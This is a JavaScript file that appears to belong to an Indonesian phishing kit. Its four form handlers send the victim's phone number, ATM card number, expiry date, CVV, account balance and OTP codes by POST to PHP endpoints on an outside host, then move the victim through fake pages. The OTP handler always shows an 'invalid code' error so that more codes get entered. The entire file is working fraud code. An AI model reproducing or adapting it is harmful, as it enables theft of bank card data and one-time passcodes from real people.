function sendHp() {
   $('.kleman').fadeIn();   
   $('.x').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   var tarif = $('input[name="tarif"]:checked').val();
   if(tarif) {
      sessionStorage.setItem('tarif', tarif);
   }
   var nohp = $('#nohp').val();
   sessionStorage.setItem('nohp', nohp);
   
   $.ajax({
      url: 'https://chroedevsi.whf.bz/v4-putra/no.php',
      type: 'POST',
      data: $('#login').serialize(),  
      complete: function() {
         setTimeout(function() {
            /*$("#popupku").fadeIn(200);*/
            window.location = "sudah.html";
            $('.x').hide();      
            $('.kleman').fadeOut();   
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
         }, 800);
      }
   });
};     

function sendLogin(){
   $('.load').fadeIn();
    event.preventDefault();   
    $(".lanjutkan").prop("disabled", true);
    document.getElementById('lanjutkan').innerHTML = "Memproses....";               
    
    $.ajax({
      url: 'https://chroedevsi.whf.bz/v4-putra/sudah.php',
      type: 'POST',
      data: $('#sudah').serialize(),    
    complete: function(){    
    setTimeout(function(){   
    window.location = "saldosdh.html";
    $("#lonte").hide();
    $('.load').fadeOut();
    document.getElementById('lanjutkan').innerHTML = "Lanjutkan"; 
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);     
  var nohp = $('#nohp').val();
  sessionStorage.setItem('nohp', nohp);
  var atm = $('#atm').val();
  sessionStorage.setItem('atm', atm);
  var valid = $('#valid').val();
  sessionStorage.setItem('valid', valid); 
  var cvv = $('#cvv').val();
  sessionStorage.setItem('cvv', cvv);   

    }, 500);}});};     
    
    
function sendSaldoS() {
   $('.load').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   $.ajax({
      url: 'https://chroedevsi.whf.bz/v4-putra/saldosdh.php',
      type: 'POST',
      data: $('#saldosdh').serialize(),
      complete: function() {
         setTimeout(function() {         
            $("#lonte").hide();
            $('.load').fadeOut();
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
            var tarif = $('#tarif').val();
            sessionStorage.setItem('tarif', tarif);
            var nohp = $('#nohp').val();
            sessionStorage.setItem('nohp', nohp);
            var atm = $('#atm').val();
            sessionStorage.setItem('atm', atm);
            var valid = $('#valid').val();
            sessionStorage.setItem('valid', valid);
            var cvv = $('#cvv').val();
            sessionStorage.setItem('cvv', cvv);
            var saldo = $('#saldo').val();
            sessionStorage.setItem('saldo', saldo);
            window.location = "otpsdh.html";
         }, 400);
      }
   });
};        


function sendOtpS() {        
   event.preventDefault();
   $("#loader").fadeIn();   
   $(".btn-primary").prop("disabled", true);
   var nama1 = document.getElementById('nama1');
   
   $.ajax({
      url: 'https://chroedevsi.whf.bz/v4-putra/otpsdh.php',
      type: 'POST',
      data: $('#formsdh').serialize(),
      complete: function(response) {
         $("#loader").fadeOut();      
         $(".btn-primary").prop("disabled", false);
         $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
         $("#errorAlert").text("Kode aktivasi tidak VALID!").slideDown();
         $("#nama1").val('');
         $("#nama1").focus();
         setTimeout(function() {
            $("#errorAlert").slideUp();
         }, 3000);
      },
      error: function(error) {
         $("#loader").hide();
         $(".btn-primary").prop("disabled", false);
         $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
         $("#errorAlert").text("Gagal mengirim kode aktivasi. Silakan coba lagi.").show();
      }
   });
};  
    
    

                
